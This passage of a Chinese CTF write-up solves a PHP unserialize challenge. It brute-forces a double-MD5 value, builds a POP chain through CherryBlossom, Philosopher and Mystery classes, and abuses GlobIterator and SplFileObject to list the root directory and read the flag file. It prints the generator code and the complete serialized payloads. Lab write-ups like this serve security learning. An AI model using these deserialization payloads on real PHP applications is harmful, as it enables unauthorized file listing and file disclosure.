            <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> second_hash
        num <span class="token operator">+=</span> <span class="token number">1</span>

<span class="token comment"># 目标前缀 "666"</span>
target_prefix <span class="token operator">=</span> <span class="token string">"666"</span>
result_string<span class="token punctuation">,</span> result_hash <span class="token operator">=</span> find_string_with_double_md5<span class="token punctuation">(</span>target_prefix<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"找到的字符串: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>result_string<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"第二次MD5哈希值: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>result_hash<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
</code></pre>
    <p>
     得到
     <code>
      213
     </code>
    </p>
    <blockquote>
     <p>
      接下来寻找如何触发
      <code>
       __invoke()
      </code>
     </p>
    </blockquote>
    <p>
     排除掉干扰项找到
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>  
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
  
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit1</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>
  
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>  
        <span class="token variable">$newFunc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fruit2</span><span class="token punctuation">;</span>  
        <span class="token keyword">return</span> <span class="token variable">$newFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span>  
<span class="token punctuation">}</span>
</code></pre>
    <p>
     找到这里链条已经闭合,可以写出链条。
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token string double-quoted-string">"213"</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Hello World!'</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
  
  
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span> <span class="token operator">-&gt;</span> <span class="token property">fruit1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span> <span class="token operator">-&gt;</span> <span class="token property">fruit1</span> <span class="token operator">-&gt;</span> <span class="token property">fruit2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Philosopher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span> <span class="token operator">-&gt;</span> <span class="token property">fruit1</span> <span class="token operator">-&gt;</span> <span class="token property">fruit2</span> <span class="token operator">-&gt;</span> <span class="token property">fruit10</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mystery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <h2>
     <a id="step_3__359">
     </a>
     step 3 利用
    </h2>
    <hr/>
    <p>
     <code>
      GlobIterator
     </code>
     是 PHP 中的一个内置类，属于
     <code>
      SplFileInfo
     </code>
     类的子类，用于遍历符合特定模式的文件系统路径。它实现了一个基于文件名模式匹配的迭代器，常常用于处理和读取一组符合 glob 模式（如
     <code>
      *.txt
     </code>
     ）的文件。
     <code>
      GlobIterator
     </code>
     类可以让你方便地使用迭代器模式来遍历符合模式的文件路径。
    </p>
    <h4>
     <a id="_365">
     </a>
     基本概念：
    </h4>
    <p>
     <code>
      GlobIterator
     </code>
     类是基于
     <strong>
      glob
     </strong>
     函数的，它允许你在文件系统中查找符合给定模式的文件。例如，可以使用
     <code>
      *.txt
     </code>
     来匹配所有
     <code>
      .txt
     </code>
     文件。
    </p>
    <h4>
     <a id="_368">
     </a>
     语法：
    </h4>
    <pre><code class="prism language-php"><span class="token keyword">new</span> <span class="token function">GlobIterator</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$glob_pattern</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <ul>
     <li>
      <strong>
       $glob_pattern
      </strong>
      ：一个文件路径模式，可以包含通配符（如
      <code>
       *
      </code>
      、
      <code>
       ?
      </code>
      ），用来匹配文件名或路径。
     </li>
    </ul>
    <h4>
     <a id="_375">
     </a>
     常见方法：
    </h4>
    <p>
     <code>
      GlobIterator
     </code>
     类继承了
     <code>
      Traversable
     </code>
     和
     <code>
      Iterator
     </code>
     接口，因此它可以被用于
     <code>
      foreach
     </code>
     循环进行遍历。它提供了与文件相关的信息（如文件大小、修改时间等）。
    </p>
    <h5>
     <a id="1_getFilename_378">
     </a>
     1.
     <strong>
      <code>
       getFilename()
      </code>
     </strong>
     ：
    </h5>
    <p>
     获取当前文件或目录的文件名。
    </p>
    <h5>
     <a id="2_getPathname_381">
     </a>
     2.
     <strong>
      <code>
       getPathname()
      </code>
     </strong>
     ：
    </h5>
    <p>
     获取当前文件或目录的完整路径。
    </p>
    <h5>
     <a id="3_getSize_384">
     </a>
     3.
     <strong>
      <code>
       getSize()
      </code>
     </strong>
     ：
    </h5>
    <p>
     获取当前文件的大小（以字节为单位）。
    </p>
    <h5>
     <a id="4_getMTime_387">
     </a>
     4.
     <strong>
      <code>
       getMTime()
      </code>
     </strong>
     ：
    </h5>
    <p>
     获取当前文件的最后修改时间。
    </p>
    <h5>
     <a id="5_isDir_390">
     </a>
     5.
     <strong>
      <code>
       isDir()
      </code>
     </strong>
     ：
    </h5>
    <p>
     检查当前项是否为目录。
    </p>
    <h5>
     <a id="6_isFile_393">
     </a>
     6.
     <strong>
      <code>
       isFile()
      </code>
     </strong>
     ：
    </h5>
    <p>
     检查当前项是否为文件。
    </p>
    <h4>
     <a id="_GlobIterator__396">
     </a>
     示例：使用
     <code>
      GlobIterator
     </code>
     遍历符合模式的文件
    </h4>
    <pre><code class="prism language-php"><span class="token function">getFilename</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件路径: "</span> <span class="token operator">.</span> <span class="token variable">$fileinfo</span><span class="token operator">-&gt;</span><span class="token function">getPathname</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件大小: "</span> <span class="token operator">.</span> <span class="token variable">$fileinfo</span><span class="token operator">-&gt;</span><span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" 字节\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"最后修改时间: "</span> <span class="token operator">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">,</span> <span class="token variable">$fileinfo</span><span class="token operator">-&gt;</span><span class="token function">getMTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"是否为目录: "</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token variable">$fileinfo</span><span class="token operator">-&gt;</span><span class="token function">isDir</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string single-quoted-string">'是'</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'否'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"----------------------------\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <h4>
     <a id="_409">
     </a>
     代码解析：
    </h4>
    <ol>
     <li>
      <strong>
       <code>
        GlobIterator('*.txt')
       </code>
      </strong>
      ：我们创建了一个
      <code>
       GlobIterator
      </code>
      实例，传入一个模式
      <code>
       *.txt
      </code>
      ，该模式匹配当前目录下的所有
      <code>
       .txt
      </code>
      文件。
     </li>
     <li>
      <strong>
       <code>
        foreach
       </code>
      </strong>
      ：
      <code>
       GlobIterator
      </code>
      实现了
      <code>
       Traversable
      </code>
      接口，因此它可以直接被用在
      <code>
       foreach
      </code>
      循环中进行迭代。每次迭代返回一个
      <code>
       SplFileInfo
      </code>
      对象，我们可以用它来获取文件的相关信息。
     </li>
     <li>
      <strong>
       输出文件信息
      </strong>
      ：在每次循环中，我们输出文件的：
      <ul>
       <li>
        文件名（
        <code>
         getFilename()
        </code>
        ）
       </li>
       <li>
        文件路径（
        <code>
         getPathname()
        </code>
        ）
       </li>
       <li>
        文件大小（
        <code>
         getSize()
        </code>
        ）
       </li>
       <li>
        最后修改时间（
        <code>
         getMTime()
        </code>
        ）
       </li>
       <li>
        是否为目录（
        <code>
         isDir()
        </code>
        ）
       </li>
      </ul>
     </li>
    </ol>
    <hr/>
    <blockquote>
     <p>
      写出文件列出exp,获得文件列表
     </p>
    </blockquote>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token string double-quoted-string">"213"</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$GlobIterator</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/*'</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
  
  
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span> <span class="token operator">-&gt;</span> <span class="token property">fruit1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span> <span class="token operator">-&gt;</span> <span class="token property">fruit1</span> <span class="token operator">-&gt;</span> <span class="token property">fruit2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Philosopher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span> <span class="token operator">-&gt;</span> <span class="token property">fruit1</span> <span class="token operator">-&gt;</span> <span class="token property">fruit2</span> <span class="token operator">-&gt;</span> <span class="token property">fruit10</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mystery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <pre><code>?GHCTF=O:13:"CherryBlossom":2:{s:6:"fruit1";O:13:"CherryBlossom":2:{s:6:"fruit1";N;s:6:"fruit2";O:11:"Philosopher":2:{s:7:"fruit10";O:7:"Mystery":1:{s:12:"GlobIterator";s:2:"/*";}s:7:"fruit11";s:3:"213";}}s:6:"fruit2";N;}
</code></pre>
    <hr/>
    <p>
     <code>
      SplFileObject
     </code>
     是 PHP 中的一个内置类，属于
     <strong>
      SPL
     </strong>
     （Standard PHP Library）库的一部分，它提供了一个面向对象的方式来处理文件操作。相比传统的基于函数的文件处理方式（如
     <code>
      fopen
     </code>
     、
     <code>
      fread
     </code>
     、
     <code>
      fwrite
     </code>
     等），
     <code>
      SplFileObject
     </code>
     提供了更多的封装和面向对象的特性，使得文件操作更为简洁和灵活。
    </p>
    <h4>
     <a id="_454">
     </a>
     基本概念：
    </h4>
    <p>
     <code>
      SplFileObject
     </code>
     用于表示一个文件，并允许你以面向对象的方式进行文件读取、写入、修改等操作。它继承自 PHP 内置的
     <code>
      SplFileInfo
     </code>
     类，因此你可以用它来获取文件的基本信息（如文件名、路径、大小等）。
    </p>
    <h4>
     <a id="_457">
     </a>
     常见方法：
    </h4>
    <p>
     <code>
      SplFileObject
     </code>
     提供了很多方法来进行文件操作，如读取、写入、遍历文件内容等。
    </p>
    <h5>
     <a id="1__460">
     </a>
     1.
     <strong>
      构造函数
     </strong>
     ：
    </h5>
    <pre><code class="prism language-php"><span class="token keyword">new</span> <span class="token function">SplFileObject</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$open_mode</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">,</span> <span class="token keyword type-hint">bool</span> <span class="token variable">$use_include_path</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token class-name type-declaration">resource</span> <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <ul>
     <li>
      <strong>
       $filename
      </strong>
      ：文件名，必须指定。
     </li>
     <li>
      <strong>
       $open_mode
      </strong>
      ：打开文件的模式，默认为
      <code>
       'r'
      </code>
      （只读模式），可以是
      <code>
       'r'
      </code>
      ,
      <code>
       'w'
      </code>
      ,
      <code>
       'a'
      </code>
      ,
      <code>
       'r+'
      </code>
      等。
     </li>
     <li>
      <strong>
       $use_include_path
      </strong>
      ：是否查找包含路径（默认为
      <code>
       false
      </code>
      ）。
     </li>
     <li>
      <strong>
       $context
      </strong>
      ：文件打开时使用的上下文资源（默认为
      <code>
       null
      </code>
      ）。
     </li>
    </ul>
    <h5>
     <a id="2__469">
     </a>
     2.
     <strong>
      常用方法
     </strong>
     ：
    </h5>
    <ul>
     <li>
      <strong>
       <code>
        fgetc()
       </code>
      </strong>
      ：读取文件中的下一个字符。
     </li>
     <li>
      <strong>
       <code>
        fgets()
       </code>
      </strong>
      ：读取文件中的一行。
     </li>
     <li>
      <strong>
       <code>
        fread()
       </code>
      </strong>
      ：读取指定长度的数据。
     </li>
     <li>
      <strong>
       <code>
        fwrite()
       </code>
      </strong>
      ：向文件写入数据。
     </li>
     <li>
      <strong>
       <code>
        fseek()
       </code>
      </strong>
      ：设置文件指针的位置。
     </li>
     <li>
      <strong>
       <code>
        eof()
       </code>
      </strong>
      ：检查文件指针是否已经到达文件末尾。
     </li>
     <li>
      <strong>
       <code>
        flock()
       </code>
      </strong>
      ：对文件进行锁定操作（类似于
      <code>
       flock()
      </code>
      函数）。
     </li>
     <li>
      <strong>
       <code>
        getFilename()
       </code>
      </strong>
      ：获取文件名（继承自
      <code>
       SplFileInfo
      </code>
      ）。
     </li>
     <li>
      <strong>
       <code>
        getSize()
       </code>
      </strong>
      ：获取文件大小（继承自
      <code>
       SplFileInfo
      </code>
      ）。
     </li>
     <li>
      <strong>
       <code>
        getPathname()
       </code>
      </strong>
      ：获取文件的完整路径（继承自
      <code>
       SplFileInfo
      </code>
      ）。
     </li>
    </ul>
    <h5>
     <a id="3__481">
     </a>
     3.
     <strong>
      迭代器接口
     </strong>
     ：
    </h5>
    <p>
     <code>
      SplFileObject
     </code>
     实现了
     <code>
      Traversable
     </code>
     接口，意味着你可以使用
     <code>
      foreach
     </code>
     来逐行遍历文件内容。
    </p>
    <h4>
     <a id="_1_484">
     </a>
     示例 1：读取文件内容
    </h4>
    <pre><code class="prism language-php"><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-&gt;</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出当前行</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <ul>
     <li>
      这里我们创建了一个
      <code>
       SplFileObject
      </code>
      对象，打开
      <code>
       example.txt
      </code>
      文件，并使用
      <code>
       fgets()
      </code>
      方法逐行读取文件内容直到文件末尾（
      <code>
       eof()
      </code>
      ）。
     </li>
    </ul>
    <h4>
     <a id="_2_494">
     </a>
     示例 2：写入文件
    </h4>
    <pre><code class="prism language-php"><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello, world!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span><span class="token operator">-&gt;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is a test.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 关闭文件</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <ul>
     <li>
      在这个示例中，我们以写入模式（
      <code>
       'w'
      </code>
      ）打开
      <code>
       output.txt
      </code>
      文件，使用
      <code>
       fwrite()
      </code>
      方法向文件写入内容。写入完成后，关闭文件。
     </li>
    </ul>
    <h4>
     <a id="_3_506">
     </a>
     示例 3：遍历文件（迭代器）
    </h4>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// 使用 SplFileObject 作为迭代器，逐行读取文件</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileObject</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'example.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token keyword">as</span> <span class="token variable">$line</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span>  <span class="token comment">// 输出每一行</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <ul>
     <li>
      <code>
       SplFileObject
      </code>
      实现了
      <code>
       Traversable
      </code>
      接口，因此你可以像使用普通数组一样，用
      <code>
       foreach
      </code>
      遍历文件的每一行。
     </li>
    </ul>
    <h4>
     <a id="_4_520">
     </a>
     示例 4：文件指针操作
    </h4>
    <pre><code class="prism language-php"><span class="token function">seek</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 文件指针指向第 3 行（索引从 0 开始）</span>

<span class="token comment">// 读取并输出第 3 行</span>
<span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-&gt;</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出第 3 行内容</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <ul>
     <li>
      使用
      <code>
       seek()
      </code>
      方法可以将文件指针移动到指定的行。这里
      <code>
       seek(2)
      </code>
      将指针移动到第 3 行。
     </li>
    </ul>
    <h4>
     <a id="_5_531">
     </a>
     示例 5：检查文件末尾
    </h4>
    <pre><code class="prism language-php"><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-&gt;</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 输出文件内容直到末尾</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <ul>
     <li>
      <code>
       eof()
      </code>
      方法检查文件指针是否已经到达文件末尾。你可以通过此方法来控制读取循环，确保文件没有被读取两次。
     </li>
    </ul>
    <hr/>
    <blockquote>
     <p>
      写出文件读取
     </p>
    </blockquote>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">CherryBlossom</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit1</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit2</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Philosopher</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit10</span><span class="token punctuation">;</span>  
    <span class="token keyword">public</span> <span class="token variable">$fruit11</span><span class="token operator">=</span><span class="token string double-quoted-string">"213"</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
  
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Mystery</span> <span class="token punctuation">{<!-- --></span>  
    <span class="token keyword">public</span>  <span class="token variable">$SplFileObject</span><span class="token operator">=</span><span class="token string double-quoted-string">"/flag44545615441084"</span><span class="token punctuation">;</span>  
<span class="token punctuation">}</span>  
  
  
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span> <span class="token operator">-&gt;</span> <span class="token property">fruit1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CherryBlossom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span> <span class="token operator">-&gt;</span> <span class="token property">fruit1</span> <span class="token operator">-&gt;</span> <span class="token property">fruit2</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Philosopher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token variable">$obj</span> <span class="token operator">-&gt;</span> <span class="token property">fruit1</span> <span class="token operator">-&gt;</span> <span class="token property">fruit2</span> <span class="token operator">-&gt;</span> <span class="token property">fruit10</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mystery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
  
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <pre><code>?GHCTF=O:13:"CherryBlossom":2:{s:6:"fruit1";O:13:"CherryBlossom":2:{s:6:"fruit1";N;s:6:"fruit2";O:11:"Philosopher":2:{s:7:"fruit10";O:7:"Mystery":1:{s:13:"SplFileObject";s:19:"/flag44545615441084";}s:7:"fruit11";s:3:"213";}}s:6:"fruit2";N;}
</code></pre>
    <p>
     成功获得flag
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f672e:6373646e2e6e65742f77656978696e5f35393136363535372f:61727469636c652f64657461696c732f313436313839353530" class_="artid" style="display:none">
 </p>
</div>


